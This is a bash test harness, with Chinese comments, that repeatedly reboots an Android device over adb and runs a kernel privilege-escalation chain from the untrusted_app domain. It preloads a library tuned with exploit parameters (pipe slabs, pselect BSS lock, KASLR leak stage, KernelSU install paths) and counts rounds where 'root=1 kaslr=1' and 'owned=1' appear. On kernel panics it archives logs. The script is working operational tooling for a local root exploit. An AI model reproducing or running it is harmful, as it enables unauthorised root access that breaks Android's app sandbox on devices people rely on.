#!/bin/bash
# exam2_marathon.sh -- untrusted_app 域连续考试（稳定性马拉松）
#
# 每轮：reboot fresh boot -> 泄题轮(KS_PREPARE_HALT) -> 等 app BOOT_COMPLETED
# gate dispatch(triggerChain direct) -> 保活(HANS 免疫) -> 验收判据。
#
# 终止条件：
#   1. PANIC  -- 链/泄题进行中 boot_id 变化（或断连后换 boot）=> 立即停，
#      归档全部取证（chain/receiver/hold log + pstore + dmesg）供分析。
#   2. 跑满 MAX_ROUNDS 且无 panic => 报告长期稳定，正常退出。
# 失败轮（root=0 安全失败、泄题超时）=> 归档后 reboot 进下一轮（fail amplifier）。
#
# 用法: nohup bash tools/exam2_marathon.sh [MAX_ROUNDS] > /tmp/opencode/exam2/marathon.out 2>&1 &

set -u
ABE=/mnt/c/WINDOWS/system32/adb.exe
LAN=192.168.8.10:5555
SO=/data/local/tmp/ksu_boot/preload.so
OUTDIR=/tmp/opencode/exam2/marathon
MAX_ROUNDS=${1:-12}
T_BOOT=450      # 等 boot_completed
T_HOLD=1200     # 等泄题就绪（r7 曾 18 分钟 72/72）
T_DISPATCH=900  # 等 triggerChain ENTER（gate 30min 窗口，通常 30s）
T_CHAIN=900     # 等 CHAIN_EXIT_DONE（通常 30-60s）

# 每场马拉松独立子目录：固定 round_0N 路径会被下一场同号轮覆盖
# （2026-10-23 事故：marathon5 r4 PASS 覆盖了 marathon4 r4 的 panic pstore 原文）。
RUN_TAG=$(date +%m%d_%H%M)
RDIR=$OUTDIR/run_$RUN_TAG
mkdir -p "$RDIR"
RL=$OUTDIR/results.log
log() { echo "[$(date '+%F %T')] $*" | tee -a "$RL"; }

sh_ab() { timeout 15 "$ABE" -s "$LAN" shell "$1" 2>/dev/null | tr -d '\r'; }

# boot_id: 0=同 boot 1=换 boot(panic) 2=暂不可读(断连)
boot_state() {
  local want=$1 cur
  cur=$(timeout 10 "$ABE" -s "$LAN" shell 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r\n')
  if [ -z "$cur" ]; then
    # 断连：等 20s 重连重读一次；期间设备可能正在 panic 重启
    sleep 20
    timeout 10 "$ABE" connect "$LAN" >/dev/null 2>&1
    sleep 5
    cur=$(timeout 10 "$ABE" -s "$LAN" shell 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r\n')
    [ -z "$cur" ] && { echo 2; return; }
  fi
  [ "$cur" = "$want" ] && echo 0 || echo 1
}

wait_boot() {
  local i
  for i in $(seq 1 $((T_BOOT / 10))); do
    sleep 10
    timeout 10 "$ABE" connect "$LAN" >/dev/null 2>&1
    local b
    b=$(timeout 10 "$ABE" -s "$LAN" shell 'getprop sys.boot_completed' 2>&1 | tr -d '\r\n')
    if [ "$b" = "1" ]; then
      timeout 10 "$ABE" -s "$LAN" shell 'cat /proc/sys/kernel/random/boot_id' | tr -d '\r'
      return 0
    fi
  done
  return 1
}

refocus() {
  local f
  f=$(timeout 10 "$ABE" -s "$LAN" shell 'dumpsys window | grep mCurrentFocus' 2>/dev/null | tr -d '\r')
  case "$f" in
    *postlock*) : ;;
    *) timeout 10 "$ABE" -s "$LAN" shell 'am start -n com.postlock.boot/.MainActivity >/dev/null 2>&1' >/dev/null 2>&1 ;;
  esac
}

panic_archive() {
  local rd=$1 why=$2
  mkdir -p "$rd"
  echo "PANIC $why" > "$rd/result"   # 防复用旧目录时 PASS 遗留误导（2026-10-23）
  log "PANIC! $why -- 归档取证到 $rd"
  sh_ab 'run-as com.postlock.boot cat files/postlock/chain.log' > "$rd/chain.log" 2>/dev/null
  sh_ab 'run-as com.postlock.boot cat files/postlock/receiver.log' > "$rd/receiver.log" 2>/dev/null
  sh_ab 'cat /data/local/tmp/payload_hold.log' > "$rd/payload_hold.log" 2>/dev/null
  sh_ab 'cat /data/local/tmp/postlock_restore.log' > "$rd/restore.log" 2>/dev/null
  sh_ab 'dmesg' > "$rd/dmesg.txt" 2>/dev/null
  sh_ab 'ls -la /sys/fs/pstore/ 2>&1; cat /sys/fs/pstore/console-ramoops-0 2>/dev/null' > "$rd/pstore.txt" 2>/dev/null
  sh_ab 'cat /data/local/tmp/ksu_payload 2>/dev/null; echo; cat /proc/sys/kernel/random/boot_id' > "$rd/ksu_payload.txt" 2>/dev/null
  log "取证完成。链条日志尾部："
  tail -15 "$rd/chain.log" 2>/dev/null | tee -a "$RL"
}

for ROUND in $(seq 1 "$MAX_ROUNDS"); do
  RD=$RDIR/round_$(printf '%02d' "$ROUND")
  mkdir -p "$RD"
  log "===== round $ROUND/$MAX_ROUNDS 开始 ====="

  # ---- reboot fresh boot ----
  timeout 20 "$ABE" -s "$LAN" reboot >/dev/null 2>&1
  log "round $ROUND: reboot 已发"
  if ! NB=$(wait_boot); then
    log "round $ROUND: FAIL boot 超时 -- 继续下一轮"
    continue
  fi
  log "round $ROUND: boot=$NB"
  echo "$NB" > "$RD/boot_id"
  ROUND_BOOT_MS=$(date +%s%3N)  # rlog 时间戳与 host 同域(ms)，本轮 ENTER 判新基准

  sh_ab 'am start -n com.postlock.boot/.MainActivity >/dev/null; echo ok' >/dev/null

  # ---- 泄题轮 ----
  timeout 25 "$ABE" -s "$LAN" shell "setsid nohup env LD_PRELOAD=$SO KS_LOG_SYNC=1 KS_PSELECT_BSS_LOCK=1 KS_CFGFS_LOG=1 KS_PAYLOAD_SCAN=1 KSNITCH_VERBOSE=1 KS_SLIDE_SKIP=1 KS_RECLAIM_DETERMINISTIC=1 KS_PSELECT_FOPS_VOFF=1 KS_PIPE_SLABS=15 KS_PIPE_MAX_ATTEMPTS=2 KS_WAVE_FLAT_MAX=8 KS_PREPARE_HALT=1800 KS_PAYLOAD_BASE_FILE=/data/local/tmp/skbdelta KSUD_DST=/data/local/tmp/ksud KSUD_NO_PARENT_INSTALL=1 SU_INSTALL=0 /system/bin/sh -c \"echo PAYLOAD-HOLD-DONE\" > /data/local/tmp/payload_hold.log 2>&1 < /dev/null & echo HOLD=\$!" | tr -d '\r' >> "$RD/hold_start.txt"
  log "round $ROUND: 泄题轮已起，等就绪..."

  READY=0
  for i in $(seq 1 $((T_HOLD / 12))); do
    sleep 12
    st=$(boot_state "$NB")
    if [ "$st" = "1" ]; then
      panic_archive "$RD" "round $ROUND 泄题阶段 boot_id 变化"
      exit 97
    fi
    OUT=$(sh_ab "head -1 /data/local/tmp/ksu_payload 2>/dev/null; echo H=\$(grep -c 'prepare-halt' /data/local/tmp/payload_hold.log 2>/dev/null)")
    case "$OUT" in
      *"payload boot=$NB"*"H=1"*) READY=1; break ;;
    esac
    case "$OUT" in
      *"retry 72/72"*)
        H=$(sh_ab "grep -c 'prepare-halt' /data/local/tmp/payload_hold.log")
        [ "$H" = "1" ] && { READY=1; break; }
        log "round $ROUND: 泄题 retry 耗尽未就绪"
        break ;;
    esac
  done
  if [ "$READY" != "1" ]; then
    log "round $ROUND: FAIL 泄题未就绪 -- reboot 进下一轮"
    continue
  fi
  log "round $ROUND: 泄题就绪 ($(date +%T))"

  # ---- 等 app dispatch ----
  sh_ab 'run-as com.postlock.boot wc -l < files/postlock/receiver.log' > "$RD/rlog_start.lines" 2>/dev/null
  DISPATCHED=0
  for i in $(seq 1 $((T_DISPATCH / 15))); do
    sleep 15
    st=$(boot_state "$NB")
    [ "$st" = "1" ] && { panic_archive "$RD" "round $ROUND dispatch 等待期 boot_id 变化"; exit 97; }
    refocus
    R=$(sh_ab 'run-as com.postlock.boot grep "triggerChain ENTER" files/postlock/receiver.log 2>/dev/null | tail -1')
    case "$R" in
      *ENTER*)
        TS=$(echo "$R" | grep -oE '^[0-9]+')
        # 只认本轮 boot 后的 ENTER（时间戳与 host 同域 ms）
        if [ -n "$TS" ] && [ "$TS" -gt "$ROUND_BOOT_MS" ]; then
          DISPATCHED=1; break
        fi ;;
    esac
  done
  if [ "$DISPATCHED" != "1" ]; then
    log "round $ROUND: FAIL 未 dispatch -- reboot 进下一轮"
    continue
  fi
  log "round $ROUND: app triggerChain ENTER ($(date +%T))"

  # ---- 等链结束（保活 + panic 检测）----
  # chain.log 累积不清空：记录 dispatch 时刻行数作起点
  CST=$(sh_ab 'run-as com.postlock.boot wc -l < files/postlock/chain.log')
  CST=${CST:-0}
  CHAIN_DONE=0
  for i in $(seq 1 $((T_CHAIN / 15))); do
    sleep 15
    st=$(boot_state "$NB")
    if [ "$st" = "1" ]; then
      panic_archive "$RD" "round $ROUND 链进行中 boot_id 变化（CHAIN_DONE 前）"
      exit 97
    fi
    refocus
    R=$(sh_ab "run-as com.postlock.boot tail -n +$((CST + 1)) files/postlock/chain.log 2>/dev/null | grep -E 'CHAIN_EXIT_DONE' | tail -1")
    [ -n "$R" ] && { CHAIN_DONE=1; break; }
  done
  if [ "$CHAIN_DONE" != "1" ]; then
    # 超时：若链进程已死但没 DONE，或一直挂——再查一次 boot 后归档为 FAIL
    st=$(boot_state "$NB")
    [ "$st" = "1" ] && { panic_archive "$RD" "round $ROUND 链超时后 boot_id 变化"; exit 97; }
    log "round $ROUND: FAIL 链超时无 CHAIN_EXIT_DONE -- 归档 reboot 进下一轮"
    sh_ab 'run-as com.postlock.boot cat files/postlock/chain.log' > "$RD/chain.log" 2>/dev/null
    continue
  fi

  # ---- 判据 ----
  sh_ab 'run-as com.postlock.boot cat files/postlock/chain.log' > "$RD/chain.log" 2>/dev/null
  NEWSEG=$(tail -n +"$((CST + 1))" "$RD/chain.log" 2>/dev/null)
  ROOT1=$(echo "$NEWSEG" | grep -c 'root=1 kaslr=1')
  OWNED=$(echo "$NEWSEG" | grep -oE 'waves=[0-9]+ taken=[0-9]+ owned=1' | tail -1)
  REST=$(sh_ab 'grep -c POSTLOCK-RESTORE-OK /data/local/tmp/postlock_restore.log 2>/dev/null')
  # restore.log 累积：本轮 reboot 后重建，行数>0 即本轮写入（boot 换过文件被 shell 保留？）
  # -- 保守：再确认 boot 未变 + root=1 + RESTORE-OK 出现过
  st=$(boot_state "$NB")
  [ "$st" = "1" ] && { panic_archive "$RD" "round $ROUND 验收期 boot_id 变化"; exit 97; }

  if [ "$ROOT1" -ge 1 ] && [ "${REST:-0}" -ge 1 ]; then
    sleep 120  # 120s 无 reboot 判据
    st=$(boot_state "$NB")
    if [ "$st" != "0" ]; then
      panic_archive "$RD" "round $ROUND root=1 后 120s 内 boot_id 变化（收尾 panic）"
      exit 97
    fi
    sh_ab 'screencap -p /data/local/tmp/marathon.png' >/dev/null
    timeout 15 "$ABE" -s "$LAN" pull /data/local/tmp/marathon.png "$RD/bluecard.png" >/dev/null 2>&1
    log "round $ROUND: PASS root=1 $OWNED RESTORE-OK 蓝卡截图已存 ($(date +%T))"
    echo PASS > "$RD/result"
  else
    log "round $ROUND: SAFE_FAIL root1=$ROOT1 restore=$REST ($OWNED) -- reboot 进下一轮"
    echo "SAFE_FAIL root1=$ROOT1 restore=$REST $OWNED" > "$RD/result"
  fi
done

log "===== 跑满 $MAX_ROUNDS 轮，未出现 panic（长期稳定）====="
exit 0
